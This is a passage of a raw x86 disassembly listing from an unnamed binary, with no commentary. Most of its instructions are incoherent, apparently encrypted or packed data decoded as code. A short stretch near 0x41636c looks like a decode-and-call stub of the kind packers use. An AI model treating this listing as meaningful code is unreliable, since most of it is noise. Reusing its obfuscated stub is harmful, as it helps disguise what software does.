  416288:	sub    BYTE PTR [ebx],bh
  41628a:	cli    
  41628b:	mov    al,ds:0x2d2e108b
  416290:	mov    bh,0x36
  416292:	aam    0xb6
  416294:	adc    DWORD PTR [edx+0x1],eax
  416297:	xchg   ebp,eax
  416298:	inc    edx
  416299:	adc    DWORD PTR [ebx],0xfffffffa
  41629c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41629d:	mov    bl,BYTE PTR [edi+0x51]
  4162a0:	sub    al,0xb3
  4162a2:	pop    eax
  4162a3:	(bad)  
  4162a4:	aas    
  4162a5:	xchg   ebx,eax
  4162a6:	scas   eax,DWORD PTR es:[edi]
  4162a7:	scas   al,BYTE PTR es:[edi]
  4162a8:	add    al,0x49
  4162aa:	fcom   QWORD PTR [ecx]
  4162ac:	adc    BYTE PTR [eax+0x7c46b49a],dh
  4162b2:	fisttp WORD PTR [esi+0x19bb4c99]
  4162b8:	inc    ebp
  4162b9:	jl     0x416311
  4162bb:	and    ebx,DWORD PTR [ebx+edi*4+0x2b]
  4162bf:	or     BYTE PTR [edx],cl
  4162c1:	sbb    bh,BYTE PTR cs:[eax+0x65]
  4162c5:	sti    
  4162c6:	or     BYTE PTR [edx-0x4c43321],cl
  4162cc:	test   BYTE PTR [ebp-0x47f7026c],dh
  4162d2:	mov    ecx,0xf8d04b6c
  4162d7:	neg    bl
  4162d9:	xchg   esi,eax
  4162da:	xchg   esp,eax
  4162db:	scas   eax,DWORD PTR es:[edi]
  4162dc:	icebp  
  4162dd:	and    dh,cl
  4162df:	enter  0x1789,0x5b
  4162e3:	lahf   
  4162e4:	das    
  4162e5:	cmp    al,0x9b
  4162e7:	gs call 0x53332dbb
  4162ed:	mov    ah,0xa7
  4162ef:	mov    eax,0xc4b754ba
  4162f4:	mov    eax,ds:0x279113bc
  4162f9:	inc    ecx
  4162fa:	(bad)  
  4162fb:	aas    
  4162fc:	in     eax,0xb4
  4162fe:	in     eax,0xd2
  416300:	or     eax,0x9bbb0c64
  416305:	test   eax,0xeb24796e
  41630a:	xchg   esi,eax
  41630b:	pop    edx
  41630c:	pop    edi
  41630d:	pusha  
  41630e:	std    
  41630f:	push   ebp
  416310:	cmp    eax,DWORD PTR [edi]
  416312:	ja     0x4162fc
  416314:	and    dh,cl
  416316:	cld    
  416317:	das    
  416318:	jp     0x4162f0
  41631a:	fbstp  TBYTE PTR [edi-0x42]
  41631d:	add    BYTE PTR [ecx*2+0x2c1fa7de],cl
  416324:	jp     0x41632c
  416326:	xor    esp,DWORD PTR [edi-0x486763ff]
  41632c:	loop   0x41639f
  41632e:	clc    
  41632f:	adc    eax,0x8640bcc7
  416334:	jmp    0x49b0:0x646206d7
  41633b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41633c:	push   eax
  41633d:	pop    ebp
  41633e:	pusha  
  41633f:	aam    0xf4
  416341:	dec    edi
  416342:	inc    esp
  416343:	data16 sub bh,BYTE PTR [esi+edi*8+0x1e]
  416348:	or     edx,DWORD PTR [edx+0x13]
  41634b:	or     BYTE PTR [edi+0x468b8df4],0xdc
  416352:	or     bh,BYTE PTR [ebp+0x9]
  416355:	adc    al,0xd8
  416357:	sbb    bh,ch
  416359:	ret    0x110f
  41635c:	mov    DWORD PTR [ebx],0x8f092995
  416362:	sbb    eax,0xb68a352
  416367:	xor    eax,0xb8220b9b
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xf9c5c841
  4163bf:	push   DWORD PTR [ecx]
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416374
  4163ca:	fmul   st(5),st
  4163cd:	hlt    
  4163ce:	gs ins DWORD PTR es:[edi],dx
  4163d0:	xchg   cl,bl
  4163d2:	repnz mov edi,0x38cef4df
  4163d8:	out    dx,eax
  4163d9:	xor    eax,0x90516aec
  4163de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163df:	and    al,0xef
  4163e1:	(bad)  
  4163e2:	cli    
  4163e3:	jp     0x4163a6
  4163e5:	jecxz  0x416456
  4163e7:	jb     0x4163d4
  4163e9:	sar    DWORD PTR [edx],0xd0
  4163ec:	xor    DWORD PTR [edx-0x79c6ff1e],0x88e19990
  4163f6:	stc    
  4163f7:	fcom   DWORD PTR [esi+eax*2-0x514e6c7e]
  4163fe:	into   
  4163ff:	cmp    BYTE PTR [eax],bh
  416401:	lahf   
  416402:	stos   DWORD PTR es:[edi],eax
  416403:	cld    
  416404:	jne    0x41638b
  416406:	rcl    BYTE PTR [edx+0x5637c3da],cl
  41640c:	sub    ebp,ecx
  41640e:	dec    esp
  41640f:	rol    BYTE PTR [ecx+ebx*2+0x45748796],cl
  416416:	push   esi
  416417:	cmp    bl,dl
  416419:	xor    ebp,DWORD PTR [esi+ebx*2+0x698ab72a]
  416420:	ret    
  416421:	sub    eax,0x1ee2f4ff
  416426:	jp     0x416456
  416428:	inc    esp
  416429:	(bad)
  41642c:	jl     0x416411
  41642e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41642f:	fbstp  TBYTE PTR [ecx]
  416431:	and    DWORD PTR [edx+0x49],ebp
  416434:	cli    
  416435:	sub    DWORD PTR [esi],ebx
  416437:	sub    eax,0xbc77071
  41643c:	lds    edi,FWORD PTR [edi-0x18]
  41643f:	xchg   ebp,eax
  416440:	inc    DWORD PTR [eax+0x5178efef]
  416446:	adc    dh,BYTE PTR [edx]
  416448:	jl     0x41640e
  41644a:	xchg   edx,eax
  41644b:	push   0x9574797d
  416450:	jecxz  0x416428
  416452:	add    eax,DWORD PTR [ebx]
  416454:	(bad)  
  416455:	imul   ecx,DWORD PTR [esi*4-0x700696b7],0x29
  41645d:	push   ecx
  41645e:	call   0x35c0:0x4298b58d
  416465:	pop    edx
  416466:	fst    DWORD PTR [ecx+0x72491ac]
  41646c:	inc    eax
  41646d:	adc    eax,0x8e167ae3
  416472:	pop    esi
  416473:	sub    BYTE PTR [ebp+0x2b2e7cc3],bl
  416479:	jmp    0x154f128
  41647e:	es in  al,0x73
  416481:	jne    0x416474
  416483:	xor    DWORD PTR [eax+0x57555f7a],eax
  416489:	retf   
  41648a:	and    DWORD PTR [edi+0x49],ecx
  41648d:	mov    ecx,0xb8fe7ed9
  416492:	push   esi
  416493:	daa    
  416494:	out    0x83,al
  416496:	aas    
  416497:	xchg   esi,eax
  416498:	bound  eax,QWORD PTR [edx-0x35cb762e]
  41649e:	adc    eax,0x30c93b5d
  4164a3:	or     al,0x7d
  4164a5:	sbb    dh,BYTE PTR [ecx+0x68fc69a6]
  4164ab:	mov    eax,ds:0x55d04e27
  4164b0:	pop    esi
  4164b1:	pop    esp
  4164b2:	pop    ebx
  4164b3:	rcr    DWORD PTR [edx-0x2712f97e],cl
  4164b9:	(bad)  
  4164ba:	xchg   ebx,eax
  4164bb:	pop    es
  4164bc:	jne    0x4164ab
  4164be:	adc    BYTE PTR [edx],bh
  4164c0:	out    dx,eax
  4164c1:	adc    eax,0x8d47dac7
  4164c6:	shr    BYTE PTR [edi],1
  4164c8:	xchg   DWORD PTR [ebx+esi*2+0x72cb901c],edi
  4164cf:	fsubr  DWORD PTR [esi]
  4164d1:	(bad)  
  4164d3:	mov    ch,0x8f
  4164d5:	iret   
  4164d6:	repz xor BYTE PTR [ebp-0x4ce7f287],dh
  4164dd:	add    esp,esp
  4164df:	(bad)  
  4164e0:	cmc    
  4164e1:	push   esp
  4164e2:	inc    ebx
  4164e3:	imul   esp,DWORD PTR [edi+0x5],0xffffffbc
  4164e7:	or     al,0x60
  4164e9:	mov    edx,DWORD PTR [edi]
  4164eb:	xchg   edx,eax
  4164ec:	frstor [edi-0x4a9d992e]
  4164f2:	mov    ah,0x2e
  4164f4:	mov    eax,ds:0x15ddad54
  4164f9:	pop    ds
  4164fa:	daa    
  4164fb:	cmp    esp,DWORD PTR [ebx]
  4164fd:	pop    ss
  4164fe:	mov    fs,WORD PTR [ecx-0xb407902]
  416504:	mov    ah,0x9f
  416506:	push   ss
  416507:	push   es
  416508:	jl     0x41649d
  41650a:	mov    ds:0xa1b5098f,eax
  41650f:	rcr    DWORD PTR [ecx+0x3f],1
  416512:	or     al,0x10
  416514:	adc    ebp,DWORD PTR [esi+eiz*1+0x7b3e60be]
  41651b:	cld    
  41651c:	cmc    
  41651d:	fadd   DWORD PTR [esi-0x3044bcbd]
  416523:	in     al,dx
  416524:	inc    ebp
  416525:	mov    ds:0xb7959f6e,al
  41652a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41652b:	rol    BYTE PTR [edi-0x1f1062ee],0xeb
  416532:	int    0x49
  416534:	pop    eax
  416535:	in     al,0xd7
  416537:	jae    0x4165a1
  416539:	pop    ebp
  41653a:	mov    BYTE PTR [edx],ah
  41653c:	inc    ecx
  41653d:	ins    BYTE PTR es:[edi],dx
  41653e:	and    esi,esi
  416540:	outs   dx,DWORD PTR ds:[esi]
  416541:	add    ebx,edi
  416543:	hlt    
  416544:	xchg   ebp,eax
  416545:	xchg   DWORD PTR [eax+eiz*8+0xd],ebx
  416549:	or     BYTE PTR [ebx],ah
  41654b:	or     DWORD PTR [ebp+0xb062e7e],0x1efc6882
  416555:	jnp    0x41653e
  416557:	mov    al,0x95
  416559:	stc    
  41655a:	sub    BYTE PTR [ebp+esi*8+0xf64ff80],0x20
  416562:	mov    ecx,0x94c7e980
  416567:	sub    dl,BYTE PTR [edx]
  416569:	and    eax,0xcac1270b
  41656e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41656f:	adc    ebp,eax
  416571:	pop    ss
  416572:	cmp    edi,DWORD PTR [edi+0x3fea1a70]
  416578:	mov    al,0xac
  41657a:	rcr    al,1
  41657c:	jnp    0x4165c0
  41657e:	in     al,dx
  41657f:	push   ds
  416580:	shl    cl,0x6
  416583:	sub    esp,DWORD PTR [ebx+eiz*2-0x7efe1304]
  41658a:	add    al,0x49
  41658c:	pop    esi
  41658d:	lods   al,BYTE PTR ds:[esi]
  41658e:	xchg   esi,eax
  41658f:	add    al,0xdf
  416591:	call   0x3eb3:0xc0bd029a
  416598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416599:	stos   DWORD PTR es:[edi],eax
  41659a:	jnp    0x416610
  41659c:	xor    al,0xc9
  41659e:	inc    eax
  41659f:	mov    dl,dl
  4165a1:	lods   al,BYTE PTR ds:[esi]
  4165a2:	mov    ecx,DWORD PTR [ebx-0xf]
  4165a5:	ficom  WORD PTR [edi-0x316ceb53]
  4165ab:	scas   al,BYTE PTR es:[edi]
  4165ac:	and    edi,DWORD PTR [edi]
  4165ae:	adc    DWORD PTR [esi+ebx*4-0x50f8be6d],esp
  4165b5:	clc    
  4165b6:	push   eax
  4165b7:	call   0xe5bb:0x5aef7488
  4165be:	or     DWORD PTR [ecx+0x779e47eb],ebp
  4165c4:	xor    esi,edi
  4165c6:	mov    ds:0x704d3b6a,eax
  4165cb:	xchg   edx,eax
  4165cc:	out    dx,al
  4165cd:	call   0x775b6202
  4165d2:	jmp    0x894c:0x92e890c3
  4165d9:	jbe    0x416625
  4165db:	mov    eax,ds:0x4753417c
  4165e0:	sub    cl,0x60
  4165e3:	jo     0x416644
  4165e5:	and    BYTE PTR [eax],ch
  4165e7:	outs   dx,DWORD PTR ds:[esi]
  4165e8:	fisttp WORD PTR [ecx]
  4165ea:	cmp    DWORD PTR [edx+edi*1-0x5efe622b],eax
  4165f1:	cmpxchg BYTE PTR [edi],bh
  4165f4:	popf   
  4165f5:	cli    
  4165f6:	mov    eax,0x69414e75
  4165fb:	add    ecx,ebp
  4165fd:	ins    DWORD PTR es:[edi],dx
  4165fe:	(bad)  
  4165ff:	fiadd  WORD PTR [ebx]
  416601:	sub    BYTE PTR [ebx-0x8ca7d3a],bl
  416607:	gs fcmovb st,st(6)
  41660a:	dec    esi
  41660b:	mov    ebx,0xf8a6fefc
  416610:	adc    eax,0x68fb99c9
  416615:	mov    ecx,DWORD PTR [edi]
  416617:	mov    ds:0xc71c9cfb,eax
  41661c:	adc    ch,BYTE PTR [edi+edi*8-0x4695c36d]
  416623:	jmp    0x9427:0x477cd08c
  41662a:	jmp    0x896:0x6d170fe3
  416631:	mov    ch,0xf8
  416633:	enter  0x7199,0x92
  416637:	xor    DWORD PTR [ecx],edx
  416639:	dec    eax
  41663a:	push   ecx
  41663b:	add    ah,BYTE PTR gs:[ecx+ebx*2-0x7d487d12]
  416643:	sub    edx,eax
  416645:	push   eax
  416646:	jmp    0xf08d:0xe86b2a3e
  41664d:	xchg   ecx,eax
  41664e:	test   DWORD PTR [ebp-0x7d669de5],ebp
  416654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416655:	repz arpl cx,bx
  416658:	lock ins DWORD PTR es:[edi],dx
  41665a:	pop    ss
  41665b:	fs nop
  41665d:	inc    esp
  41665e:	mov    ch,0x29
  416660:	ins    DWORD PTR es:[edi],dx
  416661:	jno    0x416612
  416663:	rcl    BYTE PTR [eax],cl
  416665:	enter  0x150,0x17
  416669:	enter  0x44b8,0xa8
  41666d:	cmp    esp,DWORD PTR [ecx-0x27]
  416670:	bound  ebx,QWORD PTR [esp+ebp*1-0x42]
  416674:	ins    DWORD PTR es:[edi],dx
  416675:	sti    
  416676:	dec    ebx
  416677:	mov    dh,0xc9
  416679:	xchg   ebx,eax
  41667a:	pop    ss
  41667b:	in     eax,0x85
  41667d:	fcmovnb st,st(5)
  41667f:	add    DWORD PTR [edi+0x7d],edi
  416682:	mov    edi,0x2799f886
  416687:	(bad)  
  416688:	lds    edx,FWORD PTR [edi]
  41668a:	scas   al,BYTE PTR es:[edi]
  41668b:	xchg   edx,eax
  41668c:	cmp    ch,0x3e
  41668f:	cmp    DWORD PTR [edx+0x6a590a6a],edx
  416695:	add    al,0x5b
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166df
  4166ae:	pusha  
  4166af:	pop    eax
  4166b0:	xor    DWORD PTR [edx+edx*1+0x7f],ebx
  4166b4:	jo     0x41666f
  4166b6:	jle    0x416728
  4166b8:	jo     0x41672f
  4166ba:	(bad)  
  4166bb:	add    edx,DWORD PTR es:[edi]
  4166be:	mov    bh,bl
  4166c0:	cmp    DWORD PTR ds:0x5b27e5c9,edx
  4166c6:	imul   esp,DWORD PTR [edx],0x59
  4166c9:	lds    eax,FWORD PTR [ecx-0x3c824aa2]
  4166cf:	pop    edx
  4166d0:	(bad)  
  4166d1:	jno    0x41674c
  4166d3:	(bad)  
  4166d4:	jp     0x41666b
  4166d6:	add    bh,bh
  4166d8:	sti    
  4166d9:	es in  al,0xb8
  4166dc:	inc    edx
  4166dd:	push   esi
  4166de:	fcomp  DWORD PTR [edx-0x4]
  4166e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166e2:	(bad)  
  4166e3:	or     al,0xb
  4166e5:	imul   esi,eax,0x49
  4166e8:	outs   dx,BYTE PTR ds:[esi]
  4166e9:	mov    edx,DWORD PTR [ebx-0x20]
  4166ec:	fimul  WORD PTR [eax-0x19a46ed5]
  4166f2:	je     0x4166e0
  4166f4:	sub    DWORD PTR [eax+eiz*1-0x19c45706],eax
  4166fb:	push   eax
  4166fc:	mov    esi,0x85fc4310
  416701:	push   edi
  416702:	ret    0x8ffa
  416705:	clc    
  416706:	gs pusha 
  416708:	mov    DWORD PTR [ecx],ebx
  41670a:	dec    ecx
  41670b:	adc    BYTE PTR [edx],0xf0
  41670e:	imul   ecx,DWORD PTR [eax-0x60],0x1e
  416712:	jb     0x416769
  416714:	fst    DWORD PTR [esi+0x35]
  416717:	mov    ecx,DWORD PTR [eax-0x21]
  41671a:	loope  0x4166a2
  41671c:	cmp    al,0x15
  41671e:	pop    edx
  41671f:	sub    dl,BYTE PTR [ecx]
  416721:	jle    0x4166bb
  416723:	xchg   ebp,eax
  416724:	mov    eax,0xff622821
  416729:	in     eax,0x30
  41672b:	mov    ?,WORD PTR [edi]
  41672d:	aam    0x65
  41672f:	mov    bh,BYTE PTR [edi]
  416731:	and    ah,bh
  416733:	sub    al,BYTE PTR [eax]
  416735:	imul   ecx,DWORD PTR [eax*2-0x59ef5003],0x58a35bcb
  416740:	sbb    DWORD PTR ss:[ebx],ebx
  416743:	xchg   ecx,eax
  416744:	scas   al,BYTE PTR es:[edi]
  416745:	test   DWORD PTR [edi-0x5d925ff0],0x5f0b4e99
  41674f:	in     al,0x80
  416751:	ja     0x41676d
  416753:	loop   0x41679a
  416755:	pop    ebp
  416756:	jl     0x416709
  416758:	in     al,dx
  416759:	shl    DWORD PTR [esi+edi*8],cl
  41675c:	loopne 0x416757
  41675e:	mov    DWORD PTR [esi+0x7f],esi
  416761:	popf   
  416762:	lods   al,BYTE PTR ds:[esi]
  416763:	jmp    0xea7c:0x5dd13980
  41676a:	fistp  DWORD PTR [eax+0x53]
  41676d:	adc    eax,esi
  41676f:	es and eax,0x351c30d1
  416775:	je     0x4167df
  416777:	retf   
  416778:	jns    0x416781
  41677a:	outs   dx,BYTE PTR ds:[esi]
  41677b:	add    al,0x63
  41677d:	leave  
  41677e:	fld1   
  416780:	test   DWORD PTR [eax],ebp
  416782:	mov    dh,0x6f
  416784:	mov    esi,0xe2ee07c1
  416789:	dec    eax
  41678a:	xchg   edx,eax
  41678b:	dec    eax
  41678c:	mov    edi,0xe2d60b37
  416791:	and    esp,ebp
  416793:	dec    ebp
  416794:	xchg   ecx,eax
  416795:	mov    al,0xde
  416797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416798:	dec    esi
  416799:	cwde   
  41679a:	mov    DWORD PTR [eax-0x6e353b59],esp
  4167a0:	xchg   esp,eax
  4167a1:	and    esi,DWORD PTR [ecx+0x18]
  4167a4:	mov    bh,0x1a
  4167a6:	lahf   
  4167a7:	mov    ebx,0x819201be
  4167ac:	lock pop ds
  4167ae:	dec    edx
  4167af:	in     al,dx
  4167b0:	lds    esp,FWORD PTR [ebx]
  4167b2:	test   eax,0x6866af9f
  4167b7:	fwait
  4167b8:	jne    0x416785
  4167ba:	cmp    BYTE PTR [eax+0x4c783a6a],0x65
  4167c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167c2:	mov    ds:0x9e227d96,eax
  4167c7:	fld    QWORD PTR [esi]
  4167c9:	mov    cl,BYTE PTR [edx]
  4167cb:	outs   dx,DWORD PTR ss:[esi]
  4167cd:	pop    ecx
  4167ce:	shl    BYTE PTR [edi+0x69],cl
  4167d1:	pop    ebx
  4167d2:	pop    ecx
  4167d3:	(bad)  
  4167d4:	(bad)  
  4167d5:	iret   
  4167d6:	loop   0x41679d
  4167d8:	dec    esp
  4167d9:	push   esi
  4167da:	test   eax,0xb5c96e38
  4167df:	pop    ecx
  4167e0:	sub    al,0x2e
  4167e2:	std    
  4167e3:	sar    cl,0x55
  4167e6:	pop    ss
  4167e7:	push   ecx
  4167e8:	dec    ecx
  4167e9:	lods   eax,DWORD PTR ds:[esi]
  4167ea:	stos   DWORD PTR es:[edi],eax
  4167eb:	add    ebx,0xffffff99
  4167ee:	shl    BYTE PTR [esi],1
  4167f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167f1:	call   0x339a503d
  4167f6:	add    esi,DWORD PTR [ebx]
  4167f8:	sub    dh,BYTE PTR [ebx-0x5d]
  4167fb:	data16 (bad) 
  4167fd:	rol    DWORD PTR [ebx+eiz*2+0x1e],cl
  416801:	sbb    BYTE PTR [ebx+0x53],ah
  416804:	je     0x416805
  416806:	rcr    BYTE PTR [ebp+0x35],cl
  416809:	sub    al,0xec
  41680b:	fcomp  DWORD PTR [esi-0x11]
  41680e:	(bad)  
  41680f:	into   
  416810:	xchg   ebp,eax
  416811:	fxch   st(0)
  416813:	je     0x4167a2
  416815:	ret    
  416816:	outs   dx,BYTE PTR ds:[esi]
  416817:	ins    BYTE PTR es:[edi],dx
  416818:	test   al,0xd0
  41681a:	cmp    al,0xf9
  41681c:	fcomp  DWORD PTR [ecx-0x3b]
  41681f:	not    DWORD PTR [eax+0x52155b2e]
  416825:	in     eax,dx
  416826:	test   DWORD PTR [esi],esp
  416828:	ins    DWORD PTR es:[edi],dx
  416829:	call   0x2964bdb8
  41682e:	sub    BYTE PTR [ebx],0x62
  416831:	push   esp
  416832:	lock (bad) 
  416834:	jbe    0x4167bf
  416836:	adc    BYTE PTR [ebx+0x49e3b6c8],ah
  41683c:	jno    0x4167ca
  41683e:	ret    0xdd51
  416841:	jge    0x4168ad
  416843:	adc    BYTE PTR [edx],bl
  416845:	cwde   
  416846:	xor    al,0x20
  416848:	mov    DWORD PTR [ebx+0x60921611],0xb694db3
  416852:	test   al,0x1a
  416854:	fstp   TBYTE PTR [esi]
  416856:	fs fadd st,st(4)
  416859:	adc    al,0xe5
  41685b:	ins    DWORD PTR es:[edi],dx
  41685c:	pop    ss
  41685d:	cmp    BYTE PTR [ebx],0xe
  416860:	sahf   
  416861:	push   esp
  416862:	and    bl,BYTE PTR [eax+0x8]
  416865:	sub    BYTE PTR [eax-0x57f30577],bh
  41686b:	pushf  
  41686c:	stos   DWORD PTR es:[edi],eax
  41686d:	pop    edi
  41686e:	or     BYTE PTR ds:0xf9a8c985,cl
  416874:	imul   eax,edx,0x259f085f
  41687a:	fwait
  41687b:	ins    DWORD PTR es:[edi],dx
  41687c:	test   dh,0xde
  41687f:	or     bl,cl
  416881:	rcl    BYTE PTR es:[ebx-0x51d20eec],1
  416888:	jecxz  0x4168f5
  41688a:	mov    ah,0x80
  41688c:	sub    ebp,DWORD PTR [eax+0x2b]
  41688f:	adc    eax,0xa5d0059a
  416894:	sub    ch,BYTE PTR [edx+0x215c4122]
  41689a:	cmc    
  41689b:	pop    es
  41689c:	xchg   ebx,eax
  41689d:	sub    BYTE PTR [edi+0xa],ah
  4168a0:	pop    edi
  4168a1:	lods   eax,DWORD PTR ds:[esi]
  4168a2:	or     DWORD PTR [ebp+0x1219c031],ecx
  4168a8:	fwait
  4168a9:	jo     0x41690b
  4168ab:	gs (bad) 
  4168ad:	out    0x34,al
  4168af:	jo     0x416864
  4168b1:	dec    ebx
  4168b2:	mov    al,ds:0xe003a3b0
  4168b7:	sbb    ah,dh
  4168b9:	xlat   BYTE PTR ds:[ebx]
  4168ba:	bnd jmp 0x10341653
  4168c0:	xor    DWORD PTR [ebx],ebp
  4168c2:	lods   eax,DWORD PTR ds:[esi]
  4168c3:	mov    al,BYTE PTR [ecx+edx*8]
  4168c6:	inc    ebp
  4168c7:	imul   eax,DWORD PTR [edx-0x6b],0xffffffd4
  4168cb:	cmc    
  4168cc:	shl    DWORD PTR [eax+edi*4],0x9e
  4168d0:	aam    0x54
  4168d2:	cmp    BYTE PTR [eax+0x7c45bd7f],ah
  4168d8:	jae    0x416901
  4168da:	jae    0x41687a
  4168dc:	call   FWORD PTR gs:[ebx]
  4168df:	sahf   
  4168e0:	push   cs
  4168e1:	dec    ebx
  4168e2:	pushf  
  4168e3:	lods   al,BYTE PTR ds:[esi]
  4168e4:	and    BYTE PTR ds:0x4dc79db0,0xe5
  4168eb:	addr16 jne 0x4168b6
  4168ee:	pop    ss
  4168ef:	ja     0x4168bb
  4168f1:	ret    
  4168f2:	mov    edx,0x4c961c28
  4168f7:	iret   
  4168f8:	or     DWORD PTR [ecx-0x6207b88e],edi
  4168fe:	(bad)  
  4168ff:	ss sbb al,bl
  416902:	fwait
  416903:	pop    ds
  416904:	lods   eax,DWORD PTR ds:[esi]
  416905:	imul   eax
  416907:	ror    BYTE PTR ds:0xc0532296,1
  41690d:	xchg   edi,eax
  41690e:	aas    
  41690f:	pop    es
  416910:	push   esi
  416911:	in     eax,dx
  416912:	call   0xfce1a55e
  416917:	push   cs
  416918:	int    0x2d
  41691a:	enter  0x4445,0x33
  41691e:	outs   dx,DWORD PTR ds:[esi]
  41691f:	addr16 sub ebp,esp
  416922:	mov    bl,0x5b
  416924:	lds    edi,FWORD PTR [edx-0x382c0bd]
  41692a:	hlt    
  41692b:	aad    0x48
  41692d:	push   dx
  41692f:	cwde   
  416930:	mov    ecx,0x536fb61e
  416935:	outs   dx,DWORD PTR ds:[esi]
  416936:	jle    0x41692a
  416938:	pushf  
  416939:	mov    dh,0x2a
  41693b:	retf   0xd939
  41693e:	iret   
  41693f:	mov    ebp,DWORD PTR [edi-0x6410e94e]
  416945:	jno    0x41695d
  416947:	ins    BYTE PTR es:[edi],dx
  416948:	cmp    al,0x7b
  41694a:	in     eax,dx
  41694b:	std    
  41694c:	fld    DWORD PTR [eax+0x45681650]
  416952:	mov    ch,0x67
  416954:	call   0x30209ca4
  416959:	add    ebp,DWORD PTR [ecx+eax*4-0x62d66785]
  416960:	iret   
  416961:	or     al,dh
  416963:	inc    esi
  416964:	add    ah,bh
  416966:	jmp    FWORD PTR ds:0xd82ffbb7
  41696c:	ins    BYTE PTR es:[edi],dx
  41696d:	mov    ebp,0xbefffd82
  416972:	mov    esp,0xc7579683
  416977:	dec    ecx
  416978:	jb     0x4169e4
  41697a:	popf   
  41697b:	and    esp,DWORD PTR [eax-0x28]
  41697e:	nop
  41697f:	mov    ebx,0xdfe9cb87
  416984:	add    al,BYTE PTR [eax]
  416986:	add    ch,dh
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	or     BYTE PTR [ebx+0x11],bh
  416996:	clc    
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x2270707e
  4169a0:	jb     0x4169bc
  4169a2:	sub    BYTE PTR [ebp-0x20],ch
  4169a5:	push   esi
  4169a6:	jno    0x4169e3
  4169a8:	add    al,0x3e
  4169aa:	ror    DWORD PTR [ecx-0x48],1
  4169ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ae:	jg     0x416a23
  4169b0:	xchg   ebp,eax
  4169b1:	xchg   esi,eax
  4169b2:	int3   
  4169b3:	fwait
  4169b4:	(bad)  
  4169b5:	pop    ds
  4169b6:	mov    ss,WORD PTR [ebp-0x3f0a7f35]
  4169bc:	jge    0x4169af
  4169be:	jecxz  0x416974
  4169c0:	push   ss
  4169c1:	hlt    
  4169c2:	cmp    DWORD PTR [esi],edx
  4169c4:	adc    eax,DWORD PTR [esi+ebx*1-0x13]
  4169c8:	popf   
  4169c9:	push   edi
  4169ca:	push   esi
  4169cb:	mov    al,ds:0x497bd978
  4169d0:	pop    edx
  4169d1:	adc    BYTE PTR [edx+0x4266fcea],ch
  4169d7:	pop    ss
  4169d8:	fisub  DWORD PTR [eax-0xd346ac5]
  4169de:	(bad)
  4169e1:	stos   DWORD PTR es:[edi],eax
  4169e2:	fwait
  4169e3:	(bad)  
  4169e4:	push   ds
  4169e5:	stc    
  4169e6:	je     0x41698d
  4169e8:	push   ecx
  4169e9:	adc    DWORD PTR [eax+0x867ab4f],ebx
  4169ef:	sbb    ebx,esp
  4169f1:	push   ds
  4169f2:	mov    WORD PTR [ecx],ss
  4169f4:	xor    al,0x70
  4169f6:	lahf   
  4169f7:	rol    BYTE PTR [ebx+0x25598a0d],1
  4169fd:	ins    BYTE PTR es:[edi],dx
  4169fe:	sbb    dl,bh
  416a00:	hlt    
  416a01:	cs sti 
  416a03:	sahf   
  416a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a05:	nop
  416a06:	(bad)  
  416a07:	rcl    DWORD PTR [edi-0xb],1
  416a0a:	push   cs
  416a0b:	sub    bl,BYTE PTR [edx-0x17]
  416a0e:	or     BYTE PTR [ebx+eiz*2+0x46],0x30
  416a13:	mov    eax,ds:0xf37737e4
  416a18:	repnz in al,0x51
  416a1b:	fs std 
  416a1d:	nop
  416a1e:	push   ebx
  416a1f:	and    al,0xb0
  416a21:	jge    0x4169f9
  416a23:	out    0xb4,eax
  416a25:	gs test al,0x40
  416a28:	jns    0x4169ef
  416a2a:	and    al,0x37
  416a2c:	sahf   
  416a2d:	(bad)  
  416a2e:	xchg   ecx,eax
  416a2f:	ror    BYTE PTR [ecx+eiz*4+0x23],0xd1
  416a34:	mov    dl,0xf
  416a36:	ds pop ecx
  416a38:	jmp    0xb8f5:0x67f6b41c
  416a3f:	cmp    BYTE PTR [edi+0x2e],cl
  416a42:	pop    ebp
  416a43:	out    dx,eax
  416a44:	mov    bl,0xe6
  416a46:	push   ecx
  416a47:	aas    
  416a48:	arpl   WORD PTR [edi-0x37],sp
